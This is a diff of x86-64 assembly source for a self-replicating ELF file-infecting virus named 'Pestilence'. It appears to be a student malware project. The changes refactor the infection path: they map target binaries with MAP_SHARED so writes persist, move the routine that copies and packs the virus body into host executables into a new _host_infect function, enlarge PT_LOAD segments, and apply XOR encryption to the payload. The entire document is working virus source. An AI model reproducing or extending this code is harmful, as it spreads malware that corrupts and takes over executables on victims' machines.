@@ -36,7 +36,6 @@ _start:
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-
 _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
@@ -74,35 +73,17 @@ _h3ll0w0rld:
 		pop rax ; mprotect
 		syscall; change protect from file to _eof
 
-; = DEBUG
-;		mov rax, 60
-;		syscall
-; =
 		lea rdi, [rel _virus]
 		mov rdx, rdi
 		lea rsi, [rel _params]
 		sub rdx, rsi
-; = DEBUG
-;		mov rdi, rdx
-;		mov rax, 60
-;		syscall
-; =
 		mov rsi, [rel length]
 		sub rsi, rdx ; length - (_virus - _params)
-; = DEBUG
-;		mov rdi, rsi
-;		mov rax, 60
-;		syscall
-; =
 		lea rdx, [rel _h3ll0w0rld]
 		mov rcx, KEY_SIZE
-		; TODO: XOR DESENCRYPTION HERE
+;		; TODO: XOR DESENCRYPTION HERE
 		call _xor_encrypt
 		pop rdx
-; = DEBUG
-;		mov rax, 60
-;		syscall
-; =
 
 	jmp .infected; TODO: has to jmp on [eb 27] (previously $-15)
 	.here:
@@ -569,8 +550,8 @@ _infect_file: ; (string rdi, stat rsi)
 	mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
 	push 3
 	pop rdx ; PROT_READ | PROT_WRITE
-	push 2
-	pop r10 ; MAP_PRIVATE
+	push 1
+	pop r10 ; MAP_SHARED
 	xor r9, r9
 	push SYSCALL_MMAP
 	pop rax ; mmap
@@ -643,48 +624,25 @@ _infect_file: ; (string rdi, stat rsi)
 
 			add rdi, 8 * 3 ; let space for params
 
-			lea r9, [rel _params]
-			lea rax, [rel _eof]
-			sub rax, r9
-			mov r9, [r12 + ST_SIZE]; statbuf.st_size
-			sub r9, rdi
+;			lea r9, [rel _params]
+;			lea rax, [rel _eof]
+;			sub rax, r9
+;			mov r9, [r12 + ST_SIZE]; statbuf.st_size
+;			sub r9, rdi
 			; check not enough size
 			; (file_size - (p_offset + p_filesz) < unpacked virus size)
-			cmp r9, rax
-			jl .unmap
+;			cmp r9, rax
+;			jl .unmap
 
 			add rdi, r13 ; addr pointer -> mmap
 
 			xor r9, r9
 			cmp r9, [rel entry_inject]
 			jne .infected
-			; host
-			push rsi
 
-			; ==		copy start of the virus
-			mov rax, rdi
-			push rax; save
-
-			lea rsi, [rel _start]
-			lea rdx, [rel _pack_start]
-			sub rdx, rsi
-			call _ft_memcpy
-
-			; ==		pack a part
-			add rdi, rdx
-			call _pack
-			push rax
-			pop r9
-
-			; ==		change rdx, rax, rdi
-			add rdx, r9
-			pop rdi; mmap
-			mov rax, rdi
-
-			pop rsi
-			add rdx, 8 * 3
-			cmp rsi, rdx
-			jl .unmap ; not enough size /w packed virus
+			call _host_infect
+			cmp rax, 0x0
+			je .unmap
 
 			jmp .params
 
@@ -709,7 +667,6 @@ _infect_file: ; (string rdi, stat rsi)
 			sub rax, 8 * 3
 
 			push rdi
-			push rsi
 			push rcx
 			mov rdi, rax
 			push rax
@@ -735,7 +692,6 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rdx
 			pop rax
 			pop rcx
-			pop rsi
 			pop rdi
 ; = DEBUG
 ;	mov rax, 60
@@ -764,16 +720,6 @@ _infect_file: ; (string rdi, stat rsi)
 			; change pt_load size
 			add [rbx + P_FILESZ], rdx; p_filesz + virus
 			add [rbx + P_MEMSZ], rdx; p_memsz + virus
-
-			; write everything in file
-			mov rdi, r11
-			push r11
-			mov rsi, r13
-			mov rdx, [r12 + ST_SIZE]
-			push SYSCALL_WRITE
-			pop rax
-			syscall
-			pop r11
 
 	.unmap:
 		push r11; munmap using r11 ?
@@ -1058,6 +1004,60 @@ _eof:
 
 ; don't need to copy the host part
 ; v
+
+; TODO: mix _get_size_pack / host_infect to do only 1 _pack --> FASTEEER
+_host_infect:
+	push rdi
+	call _get_size_pack
+	lea r9, [rel _params]
+	lea rdi, [rel _pack_start]
+	sub rdi, r9
+	add rax, rdi
+	pop rdi
+
+	cmp rsi, rax
+	jl .return_error
+
+	; host
+	; ==		copy start of the virus
+	mov rax, rdi
+	push rax; save
+
+	lea rsi, [rel _start]
+	lea rdx, [rel _pack_start]
+	sub rdx, rsi
+	call _ft_memcpy
+
+	; ==		pack a part
+	add rdi, rdx
+	call _pack
+	push rax
+	pop r9
+
+	; ==		change rdx, rax, rdi
+	add rdx, r9
+	pop rdi; mmap
+	mov rax, rdi
+
+	add rdx, 8 * 3
+	ret
+	.return_error:
+		xor rax, rax
+ret
+
+_get_size_pack:
+	push rdi
+	push rsi
+		lea rdi, [rel _pack_start]
+		lea rsi, [rel _eof]
+		sub rsi, rdi
+		sub rsp, rsi
+		mov rdi, rsp
+		call _pack
+		add rsp, rsi
+	pop rsi
+	pop rdi
+ret
 
 ;               v dest
 _pack: ;(void *rdi) -> ret size + fill rdi
